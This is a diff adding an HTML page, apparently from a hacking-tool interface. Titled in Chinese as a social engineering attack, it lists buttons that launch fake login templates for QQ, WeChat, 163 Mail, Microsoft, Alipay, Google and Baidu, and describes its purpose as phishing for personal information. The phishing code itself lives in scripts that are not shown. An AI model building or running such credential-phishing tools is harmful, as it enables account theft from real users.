@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="../../js/libui.js"></script>
+        <script src="../../js/system.js"></script>
+        <style>
+            button {
+    width: 100%;
+    height: 40px;
+    background-color: rgba(0, 0, 0, 0.555);
+    border: 1px solid green;
+    color: green;
+    margin-top: 10px;
+    text-align: left;
+}
+    p {
+        color: green;
+    }
+
+button:hover {
+    background-color: green;
+    color:black;
+}
+        </style>
+    </head>
+    <body style="padding: 50px;" id="body">
+        <h2 style="color: green;">社会工程学攻击</h2>
+        <button onclick="social_attack('QQ')">QQ登录模版</button>
+        <button onclick="social_attack('WeChat')">微信登录模版</button>
+        <button onclick="social_attack('163')">163邮箱登录模版</button>
+        <button onclick="social_attack('Microsoft')">微软账户登录模版</button>
+        <button onclick="social_attack('Alipay')">支付宝登录模版</button>
+        <button onclick="social_attack('Google')">谷歌登录模版登录模版</button>
+        <button onclick="social_attack('Baidu')">百度账户登录模版</button>
+        <p>
+            描述:<br />
+            利用各个平台的登录模版，来钓鱼获取个人信息
+        </p>
+    </body>
+</html>
